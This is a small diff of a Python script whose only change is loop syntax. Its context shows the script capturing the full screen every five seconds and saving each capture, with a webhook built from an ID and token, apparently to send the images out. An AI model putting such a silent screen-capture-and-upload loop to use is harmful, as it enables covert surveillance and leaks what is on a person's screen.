@@ -20,7 +20,7 @@ WEBHOOK = Webhook.partial(WEBHOOK_ID, WEBHOOK_TOKEN, \
 # Change 5 to seconds between each screenshot
 seconds = 5
 
-while (True):
+while True:
     time.sleep(seconds)
     img = PIL.ImageGrab.grab()
     img.save("test.jpg")
